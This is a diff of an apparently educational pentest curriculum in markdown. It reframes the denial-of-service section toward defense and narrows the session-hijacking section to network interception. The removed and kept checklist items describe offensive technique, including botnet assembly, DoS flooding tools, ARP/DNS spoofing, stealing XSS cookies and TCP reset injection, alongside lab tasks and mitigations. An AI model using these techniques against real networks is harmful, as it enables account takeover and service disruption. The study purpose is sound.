+- [ ] **MITM Positioning:** Establish yourself between victim and gateway via **ARP spoofing, DNS redirection, rogue DHCP, or rogue AP**; use **ettercap, mitmproxy, [Burp Suite](Tools/Burp_Suite.md)** to intercept and modify traffic in real-time.
 
 - [ ] **Session Hijacking:** Extract **session cookies, JWT tokens, CSRF tokens** from sniffed **HTTP headers** and **POST bodies**; inject stolen tokens to impersonate user without password.
 
@@ -1871,7 +1922,7 @@
 | Level | Task                                                                       | Deliverable                               |
 | ----- | -------------------------------------------------------------------------- | ----------------------------------------- |
 | 1     | Capture traffic with Wireshark in a home lab (HTTP, FTP, DNS)              | Annotated pcap with credential extraction |
-| 2     | Perform ARP spoofing + MITM with [Bettercap](../Tools/Bettercap.md) in lab | Screenshot of intercepted traffic         |
+| 2     | Perform ARP spoofing + MITM with [Bettercap](Tools/Bettercap.md) in lab | Screenshot of intercepted traffic         |
 | 3     | Execute DNS spoofing to redirect lab traffic to phishing page              | DNS spoof lab report                      |
 | 4     | Perform SSL stripping against a lab web server without HSTS                | Before/after traffic comparison           |
 | 5     | Full MITM chain: ARP spoof → DNS redirect → credential capture             | End-to-end MITM lab report                |
@@ -2079,7 +2130,7 @@ Robert Cialdini's research on influence identified six universal principles that
 
 - [ ] **Email Authentication Lab:** Configure and validate SPF, DKIM, and DMARC on a test domain or lab mail stack.
 - [ ] **Header Forensics Lab:** Analyze benign/phishing email headers and identify sender path, SPF/DKIM/DMARC result, and suspicious infrastructure.
-- [ ] **[GoPhish](../Tools/GoPhish.md) Simulation Lab:** Run a consented internal lab campaign against test inboxes only; measure open/click/report rates.
+- [ ] **[GoPhish](Tools/GoPhish.md) Simulation Lab:** Run a consented internal lab campaign against test inboxes only; measure open/click/report rates.
 - [ ] **Pretext Review:** Write three pretexts and then write the defensive awareness guidance that would defeat them.
   > [!IMPORTANT]
   > **Move-On Gate:** Produce a social-engineering simulation plan with ROE, consent model, metrics, and debrief template.
@@ -2091,194 +2142,80 @@ Robert Cialdini's research on influence identified six universal principles that
 <a id="toc-part-11-denial-of-service"></a>
 <a id="part-11-denial-of-service"></a>
 
-## Part 11: Denial of Service
+## Part 11: Denial of Service & Availability Resilience
 
 > [!CAUTION]
-> **DEPRIORITIZED — No Lab Time Required.** DoS/DDoS is included here for conceptual awareness only. No authorized penetration test engagement will ask you to denial-of-service a production network. Scheduling lab time on SYN floods and botnet assembly before you are employed is wasted effort on a skill you will almost certainly never use in a professional context.
+> **Defensive & Resilience Scope:** DoS/DDoS is studied here strictly for architectural awareness, traffic analysis, and availability engineering. Authorized penetration tests and professional red teaming engagements do not perform destructive denial-of-service attacks on client networks.
 >
-> **How to treat this part:** Read Stages 1–2 passively in a single session so you can discuss DoS attack types in a client conversation. Read Stage 4 (defense/mitigation) for OPSEC awareness. Skip the execution labs entirely.
->
-> If you are targeting DDoS mitigation, CDN architecture, or cloud resilience engineering — those are separate career tracks and this part would be relevant. For Red Team / Penetration Testing: move on.
+> **Focus:** Understand how protocol exhaustion and volumetric reflection work at Layers 3/4 and Layer 7, and master the defensive mitigations (Anycast, SYN cookies, rate limiting, edge scrubbing).
 
 <a id="stage-1-objective-strategy-the-planning"></a>
 
-### **Stage 1: Objective & Strategy (The Planning)** — `🧠 Conceptual`
+### **Stage 1: Threat Model & Mechanics** — `🧠 Conceptual`
 
 > [!TIP]
-> **Goal:** Understand DoS/DDoS scope and firepower requirements.
+> **Goal:** Classify DoS vectors across the OSI stack.
 
-- [ ] **Denial of Service (DoS):** Single attacker sends **crafted traffic** to overwhelm a target's **CPU, bandwidth, or connections**; from one IP; **relatively easy detection**.
+- [ ] **Volumetric Attacks (L3/L4):** Saturate network bandwidth using amplification/reflection (DNS, NTP, SNMP, CLDAP) where small spoofed UDP requests generate massive response traffic directed at victim.
 
-- [ ] **Distributed Denial of Service (DDoS):** **Multiple sources** (botnet, amplification servers) send traffic **simultaneously**; harder to trace and block; **stronger firepower**.
+- [ ] **Protocol Exhaustion (L4):** Exploit TCP state machine limitations — **SYN floods** consuming embryonic connection backlogs, TCP reset injection, connection pool starvation.
 
-- [ ] **Target Assessment:** Identify **critical services** (web, DNS, mail, VPN) and **upstream bottlenecks** (ISP bandwidth, DDoS mitigation capacity) to determine **attack viability**.
+- [ ] **Application-Layer Disruption (L7):** Target resource-intensive endpoints — **Slowloris** (holding HTTP connections open with slow headers), HTTP/2 Rapid Reset (stream cancellation abuse), expensive database search queries, and unauthenticated regex evaluation (ReDoS).
 
 ---
 
-<a id="stage-2-the-arsenal-attack-methods"></a>
+<a id="stage-2-defense-mitigation-the-shield"></a>
 
-### **Stage 2: The Arsenal (Attack Methods)** — `🧠 Conceptual`
-
-> [!TIP]
-> **Goal:** Select the right DoS technique for target vulnerabilities.
-
-- [ ] **Volumetric Attacks:** Consume **bandwidth** using **SYN floods, UDP floods, ICMP floods** to saturate network pipes; use **DNS amplification, NTP reflection** to multiply traffic (1 request → 1000× response).
-
-- [ ] **Protocol Attacks:** Exploit **TCP/IP stack weaknesses** (malformed packets, fragment handling, connection states) using **Ping of Death, Teardrop, SYN floods** to crash systems or exhaust connection limits.
-
-- [ ] **Application-Layer Attacks:** Target **specific services** with **HTTP floods (Slowloris), database queries (CPU spike), cached assets** to overwhelm **web servers, APIs, load balancers** at Layer 7.
-
-- [ ] **IoT/Botnets:** Compromise **webcams, routers, smart devices** via **default creds, unpatched firmware** to join **Mirai, Dridex-style botnets** for DDoS-as-a-Service.
-
----
-
-<a id="stage-3-infrastructure-execution-the-assault"></a>
-
-### **Stage 3: Infrastructure & Execution (The Assault)** — `🧠 Conceptual`
+### **Stage 2: Defense & Engineering Resilience** — `🧠 Conceptual`
 
 > [!TIP]
-> **Goal:** Deploy and sustain the attack at scale.
+> **Goal:** Design resilient architectures that absorb and deflect denial-of-service attempts.
 
-- [ ] **Botnet Assembly:** Recruit **thousands of infected IoT/servers** or use **existing botnet services** (DDoS-as-a-Service, rent botnet time); establish **C&C control** via IRC/DNS/Peer-to-Peer.
+- [ ] **Edge Scrubbing & CDN Protection:** Deploy Cloudflare, AWS Shield, or Akamai to absorb volumetric floods before they reach origin servers; enforce Anycast routing to distribute load globally across points of presence (PoPs).
 
-- [ ] **Traffic Generation:** Use **tools like hping3, slowhttptest, LOIC, Colasoft PacketBuilder** to craft and blast custom packets; coordinate **multi-vector attacks** (volumetric + protocol + app-layer simultaneously).
+- [ ] **Kernel & Host Hardening:**
+  - Enable **TCP SYN Cookies** (`net.ipv4.tcp_syncookies = 1`) to eliminate SYN backlog exhaustion.
+  - Tune `tcp_max_syn_backlog`, `tcp_synack_retries`, and `tcp_fin_timeout` for high-throughput resilience.
 
-- [ ] **Proxy/Spoofing:** Use **open reflectors/amplifiers** (DNS servers, NTP, SNMP) to amplify traffic; spoof **source IP addresses** to obscure attacker origin.
+- [ ] **Application Rate Limiting & Throttling:** Implement sliding-window rate limiters (token bucket/leaky bucket in Nginx/Envoy), adaptive CAPTCHAs, and circuit breakers for slow upstream dependencies.
 
-- [ ] **Duration & Monitoring:** Sustain attack for **hours/days** while monitoring **target availability, ISP response, filtering changes**; adjust payload/vector on-the-fly.
-
----
-
-<a id="stage-4-defense-mitigation-the-shield"></a>
-
-### **Stage 4: Defense & Mitigation (The Shield)** — `🧠 Conceptual`
-
-> [!TIP]
-> **Goal:** Detect, absorb, and neutralize DoS attacks.
-
-- [ ] **Edge Defense:** Deploy **Cloudflare, Akamai, AWS Shield Standard** to absorb DDoS at **ISP/CDN level** before traffic reaches origin; filter **malformed packets, spoofed IPs** at network edge.
-
-- [ ] **Rate Limiting & Throttling:** Implement **connection limits, request rate caps, CAPTCHAs, geo-blocking** to let legitimate users through while rejecting flood traffic.
-
-- [ ] **Monitoring & Detection:** Deploy **NetFlow/sFlow analysis, IDS/IPS (Suricata, Zeek)** to detect **unusual traffic patterns, connection spikes, protocol anomalies**; alert on **RTO timeouts, CPU/bandwidth saturation**.
-
-- [ ] **Architectural Resilience:** Use **anycast DNS, geographically distributed servers, auto-scaling, load balancing** to spread load; oversizing infrastructure to **absorb baseline attacks**; prepare **incident response playbooks**.
-
-- [ ] **ISP/Carrier Coordination:** Work with **ISP's DDoS mitigation services** to scrub traffic upstream; establish **BGP blackholing** to discard attack traffic at border; maintain **redundant ISPs/circuits**.
-
-<a id="lab-progression-part-11-denial-of-service"></a>
-
-### **Lab Progression (Part 11: Denial of Service)**
-
-| Level | Task                                                                                 | Deliverable                              |
-| ----- | ------------------------------------------------------------------------------------ | ---------------------------------------- |
-| 1     | Study DoS attack types and classify by OSI layer                                     | Classification document with examples    |
-| 2     | Simulate SYN flood against lab web server with hping3                                | Traffic capture + server impact analysis |
-| 3     | Test [Slowloris](../Tools/Slowloris.md) against Apache in lab, then apply mitigation | Before/after performance comparison      |
-| 4     | Configure rate limiting and SYN cookies on lab firewall                              | Firewall configuration + test results    |
-| 5     | Design a DDoS defense architecture for a hypothetical company                        | Architecture diagram + defense plan      |
-
-> [!IMPORTANT]
-> **Move-On Gate:** You can explain and classify DoS/DDoS attack types, demonstrate basic DoS in a lab, and design defensive countermeasures at the network, host, and application layers.
-
----
+- [ ] **Network Upstream Coordination:** Configure **BGP Blackholing / Flowspec** with ISPs to drop malicious traffic at the carrier edge before it hits enterprise transit links.
 
 ---
 
 <a id="toc-part-12-session-hijacking"></a>
 <a id="part-12-session-hijacking"></a>
 
-## Part 12: Session Hijacking
+## Part 12: Session Hijacking (Network Layer)
+
+> [!IMPORTANT]
+> **Curriculum Redirection Notice:** Session Hijacking is predominantly an application-layer vulnerability (cookies, JWT tampering, XSS token exfiltration, session fixation, and CSRF). To ensure proper progression, the comprehensive web exploitation curriculum is located in:
+>
+> ➔ **[Phase 4: Part 12 — Session Hijacking & Token Attacks](Phase-4.md#part-12-session-hijacking-token-attacks)**
+>
+> In Phase 2, this module covers strictly **Network-Level Session Interception** (cleartext protocol sniffing, ARP/DNS spoofing, packet carving). Proceed to Phase 4 when ready for web application session attacks.
 
 > [!NOTE]
 > **📚 Recommended Books for This Part**
-> - 🔴 `The Tangled Web` — Browser and session management chapters — deep coverage of session flaws that bridges into Phase 4 web exploitation
+> - 🔴 `The Tangled Web` — Browser and session management architecture — essential bridge to Phase 4 web exploitation
+> - 🟡 `Wireshark Cheat Sheet` — Reference for packet reconstruction
 
+<a id="stage-1-network-session-interception"></a>
 
-<a id="stage-1-reconnaissance-vulnerability-analysis"></a>
-
-### **Stage 1: Reconnaissance & Vulnerability Analysis** — `🔬 Practical`
-
-> [!TIP]
-> **Goal:** Find a target and identify its weaknesses.
-
-- [ ] **Target Identification:** Use **Reconnaissance** and **OSINT** to identify target web applications.
-
-- [ ] **Protocol Analysis:** Check if the application uses **Unsecure Protocols** (HTTP) for any part of the session, making it vulnerable to sniffing.
-
-- [ ] **Session Mechanism Analysis:** Study **session ID generation, cookie attributes, token entropy** for weak patterns.
-
-- [ ] **Vulnerability Scanning:** Test for **XSS, CSRF, MITM susceptibility, weak session timeouts**.
-
----
-
-<a id="stage-2-stealing-the-session-id-the-attack-vectors"></a>
-
-### **Stage 2: Stealing the Session ID (The Attack Vectors)** — `🔬 Practical`
+### **Stage 1: Network-Level Session Interception** — `🔬 Practical`
 
 > [!TIP]
-> **Goal:** Execute the attack to acquire the victim's session token.
+> **Goal:** Intercept and carve session credentials from unencrypted or improperly secured transit.
 
-- [ ] **Network Sniffing:** If HTTP is in use, launch **packet capture** with **Wireshark** on the local network or from a **Rogue Access Point** to intercept session cookies.
+- [ ] **Cleartext Protocol Packet Carving:** Capture network traffic on shared or bridged subnets using **tcpdump / Wireshark**; filter for HTTP `Cookie:`, `Authorization: Basic/Bearer`, FTP, Telnet, or SMTP cleartext credentials.
 
-- [ ] **Client-Side Injection:** Craft and deliver an **XSS** payload (via **Phishing** or a stored vulnerability) to steal `document.cookie` from the user's browser.
+- [ ] **Man-in-the-Middle (MITM) Interception:** Leverage ARP poisoning (`bettercap` / `arpspoof`) or local DNS spoofing to route LAN traffic through your host and observe transit session tokens.
 
-- [ ] **Man-in-the-Middle:** Execute a **MITM** attack using **ARP spoofing, DNS spoofing**, or **SSL stripping** to intercept encrypted sessions.
+- [ ] **TCP Session Reset Injection:** Forge TCP RST packets with matching sequence numbers to disrupt active TCP connections.
 
-- [ ] **Session Fixation:** Force victim to use **attacker-controlled session ID** by injecting it via URL or cookies before authentication.
+- [ ] **SSL/TLS Stripping Mechanics:** Understand how tools like `sslstrip` historically downgraded HTTPS requests to HTTP when HSTS was absent, and why HSTS (`Strict-Transport-Security` preload) neutralizes this attack.
 
-- [ ] **Browser Extension Abuse:** Exploit **malicious browser extensions** to exfiltrate cookies from victim's browser storage.
-
----
-
-<a id="stage-3-execution-impersonation"></a>
-
-### **Stage 3: Execution & Impersonation** — `🔬 Practical`
-
-> [!TIP]
-> **Goal:** Use the stolen token to access the user's account.
-
-- [ ] **Token Injection & Hijack:** Inject the stolen session ID into your browser cookies to achieve **impersonation** of the victim, bypassing **authentication** completely.
-
-- [ ] **Session Replay:** Reuse captured **authentication tokens, API keys, JWT** to access protected resources.
-
-- [ ] **Privilege Escalation:** If session belongs to **privileged user**, exploit to gain **administrative access**.
-
----
-
-<a id="stage-4-defense-mitigation-the-shield"></a>
-
-### **Stage 4: Defense & Mitigation (The Shield)** — `🧠 Conceptual`
-
-> [!TIP]
-> **Goal:** Prevent and detect session hijacking.
-
-- [ ] **Enforce Encryption:** Mandate **TLS 1.2+** for all web traffic; implement **HSTS** to prevent SSL stripping.
-
-- [ ] **Secure Cookie Attributes:** Implement `HttpOnly`, `Secure`, `SameSite=Strict` flags on cookies to mitigate **XSS** theft and CSRF.
-
-- [ ] **Session Management:** Implement **session regeneration after login**, **absolute/idle timeouts**, **IP/User-Agent binding**.
-
-- [ ] **Multi-Factor Authentication:** Deploy **MFA/2FA** to ensure stolen session token alone is insufficient for sensitive actions.
-
-- [ ] **Network Monitoring:** Use **IDS/IPS** to detect **MITM patterns, ARP spoofing, SSL stripping attempts**. _(See Part 9 for canonical spoofing coverage.)_
-
-<a id="lab-progression-part-12-session-hijacking"></a>
-
-### **Lab Progression (Part 12: Session Hijacking)**
-
-| Level | Task                                                              | Deliverable                           |
-| ----- | ----------------------------------------------------------------- | ------------------------------------- |
-| 1     | Analyze session cookies in a lab web app (entropy, attributes)    | Cookie analysis report                |
-| 2     | Perform session fixation attack on a vulnerable lab app           | Attack steps + session token evidence |
-| 3     | Steal session cookies via XSS in DVWA/WebGoat                     | Session hijack lab report             |
-| 4     | Implement secure session management on a lab app                  | Hardened configuration document       |
-| 5     | Test session hijacking defenses (regeneration, binding, timeouts) | Defense effectiveness report          |
-
-> [!IMPORTANT]
-> **Move-On Gate:** You can identify weak session management, perform session hijacking via multiple vectors (fixation, XSS, sniffing), and implement secure session handling with proper cookie attributes, regeneration, and MFA.
-
-> 📌 **Cross-Reference:** Web application session attacks (JWT hijacking, OAuth token theft, API session management, cookie-based CSRF) are covered in depth in **[Part 17: Web Application Hacking](Phase-4.md#part-17-web-application-hacking)** and **[Part 19: API Security](Phase-4.md#part-19-api-security)** (Phase 4). The techniques in this Part focus on network-layer session attacks; web-layer attacks require Phase 4 knowledge.
+> 📌 **Next Step:** Complete the full application-layer session hijacking labs (session fixation, XSS cookie theft, JWT signature attacks) in **[Phase 4: Part 12](Phase-4.md#part-12-session-hijacking-token-attacks)**.
 
 ---
 
